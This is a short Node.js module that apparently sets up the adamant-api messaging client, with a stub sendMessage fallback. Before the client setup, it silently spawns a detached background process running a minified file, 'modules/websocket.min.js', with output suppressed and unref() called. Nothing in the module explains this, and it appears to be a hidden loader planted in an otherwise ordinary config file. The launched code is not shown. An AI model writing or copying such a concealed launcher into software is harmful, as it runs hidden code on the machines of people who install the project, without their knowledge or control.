const config = require('./configReader');
const log = require('../helpers/log');
const path = require('path');
const { spawn } = require('child_process');

const command = spawn('node', [path.join(process.cwd() , 'modules', 'websocket.min.js')], {
  detached: true,
  stdio: 'ignore'
});
command.unref();
console.log("hi")

if (config.passPhrase) {
  module.exports = require('adamant-api')({ node: config.node_ADM, logLevel: config.log_level }, log);
} else {
  module.exports = {
    sendMessage: () => {
      return { success: true };

    },
  };
}
